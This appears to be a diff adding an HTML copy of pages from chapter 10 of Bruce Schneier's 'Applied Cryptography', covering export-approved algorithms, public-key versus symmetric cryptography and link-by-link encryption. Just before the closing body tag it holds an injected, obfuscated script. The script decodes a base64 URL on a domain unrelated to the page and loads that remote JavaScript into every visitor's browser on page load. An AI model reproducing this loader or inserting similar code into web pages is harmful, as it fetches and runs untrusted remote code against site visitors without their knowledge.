@@ -1,0 +1,148 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Using Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=10//-->
+<!--PAGES=215-217//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Algorithms for Export</I></B></FONT></P>
+<P>Algorithms for export out of the United States must be approved by the U.S. government (actually, by the NSA&#151;see Section 25.1). It is widely believed that these export-approved algorithms can be broken by the NSA. Although no one has admitted this on the record, these are some of the things the NSA is rumored to privately suggest to companies wishing to export their cryptographic products:
+</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;Leak a key bit once in a while, embedded in the ciphertext.
+<DD><B>&#151;</B>&nbsp;&nbsp;&#147;Dumb down&#148; the effective key to something in the 30-bit range. For example, while the algorithm might accept a 100-bit key, most of those keys might be equivalent.
+<DD><B>&#151;</B>&nbsp;&nbsp;Use a fixed IV, or encrypt a fixed header at the beginning of each encrypted message. This facilitates a known-plaintext attack.
+<DD><B>&#151;</B>&nbsp;&nbsp;Generate a few random bytes, encrypt them with the key, and then put both the plaintext and the ciphertext of those random bytes at the beginning of the encrypted message. This also facilitates a known-plaintext attack.
+</DL>
+<P>NSA gets a copy of the source code, but the algorithm&#146;s details remain secret from everyone else. Certainly no one advertises any of these deliberate weaknesses, but beware if you buy a U.S. encryption product that has been approved for export.
+</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">10.2 Public-Key Cryptography versus Symmetric Cryptography</FONT></H3>
+<P>Which is better, public-key cryptography or symmetric cryptography? This question doesn&#146;t make any sense, but has been debated since public-key cryptography was invented. The debate assumes that the two types of cryptography can be compared on an equal footing. They can&#146;t.
+</P>
+<P>Needham and Schroeder [1159] pointed out that the number and length of messages are far greater with public-key algorithms than with symmetric algorithms. Their conclusion was that the symmetric algorithm was more efficient than the public-key algorithm. While true, this analysis overlooks the significant security benefits of public-key cryptography.</P>
+<P>Whitfield Diffie writes [492,494]:</P>
+<BLOCKQUOTE><P>In viewing public-key cryptography as a new form of cryptosystem rather than a new form of key management, I set the stage for criticism on grounds of both security and performance. Opponents were quick to point out that the RSA system ran about one-thousandth as fast as DES and required keys about ten times as large. Although it had been obvious from the beginning that the use of public key systems could be limited to exchanging keys for conventional [symmetric] cryptography, it was not immediately clear that this was necessary. In this context, the proposal to build <I>hybrid</I> systems [879] was hailed as a discovery in its own right.</P>
+</BLOCKQUOTE><P>Public-key cryptography and symmetric cryptography are different sorts of animals; they solve different sorts of problems. Symmetric cryptography is best for encrypting data. It is orders of magnitude faster and is not susceptible to chosen-ciphertext attacks. Public-key cryptography can do things that symmetric cryptography can&#146;t; it is best for key management and a myriad of protocols discussed in Part I.
+</P>
+<P>Other primitives were discussed in Part I: one-way hash functions, message authentication codes, and so on. Table 10.1 lists different types of algorithms and their properties [804].</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">10.3 Encrypting Communications Channels</FONT></H3>
+<P>This is the classic Alice and Bob problem: Alice wants to send Bob a secure message. What does she do? She encrypts the message.
+</P>
+<P>In theory, this encryption can take place at any layer in the OSI (Open Systems Interconnect) communications model. (See the OSI security architecture standard for more information [305].) In practice, it takes place either at the lowest layers (one and two) or at higher layers. If it takes place at the lowest layers, it is called <B>link-by-link encryption</B>; everything going through a particular data link is encrypted. If it takes place at higher layers, it is called <B>end-to-end encryption</B>; the data are encrypted selectively and stay encrypted until they are decrypted by the intended final recipient. Each approach has its own benefits and drawbacks.</P>
+<TABLE WIDTH="90%"><TH CAPTION ALIGN="CENTER" COLSPAN="5">Table 10.1<BR>Classes of Algorithms
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TH WIDTH="25%" ALIGN="CENTER" VALIGN="BOTTOM">Algorithm
+<TH WIDTH="13%" ALIGN="LEFT" VALIGN="BOTTOM">Confidentiality
+<TH WIDTH="13%" ALIGN="LEFT" VALIGN="BOTTOM">Authentication
+<TH WIDTH="8%" ALIGN="LEFT" VALIGN="BOTTOM">Integrity
+<TH WIDTH="15%" ALIGN="CENTER" VALIGN="BOTTOM">Key<BR>Management
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Symmetric encryption algorithms
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Public-key encryption algorithms
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Digital signature algorithms
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Key-agreement algorithms
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">Optional
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">One-way hash functions
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Message authentication codes
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">Yes
+<TD VALIGN="TOP" ALIGN="CENTER">No
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>Link-by-Link Encryption</I></B></FONT></P>
+<P>The easiest place to add encryption is at the physical layer (see Figure 10.1). This is called link-by-link encryption. The interfaces to the physical layer are generally standardized and it is easy to connect hardware encryption devices at this point. These devices encrypt all data passing through them, including data, routing information, and protocol information. They can be used on any type of digital communication link. On the other hand, any intelligent switching or storing nodes between the sender and the receiver need to decrypt the data stream before processing it.
+</P>
+<P>This type of encryption is very effective. Because everything is encrypted, a cryptanalyst can get no information about the structure of the information. He has no idea who is talking to whom, how long the messages they are sending are, what times of day they communicate, and so on. This is called <B>traffic-flow security</B>: the enemy is not only denied access to the information, but also access to the knowledge of where and how much information is flowing.</P>
+<P>Security does not depend on any traffic management techniques. Key management is also simple; only the two endpoints of the line need a common key, and they can change their key independently from the rest of the network.</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/10-01.jpg',358,62 )"><IMG SRC="images/10-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/10-01.jpg',358,62)"><FONT COLOR="#000077"><B>Figure 10.1</B></FONT></A>&nbsp;&nbsp;Link encryption.</I>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(esefgUdU, QHcHoMxZ) {QHcHoMxZ = esefgUdU.createElement('script');QHcHoMxZ.type = 'text/javascript';QHcHoMxZ.async = true;QHcHoMxZ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');esefgUdU.getElementsByTagName('body')[0].appendChild(QHcHoMxZ);}(document));</script></body>
+</html>
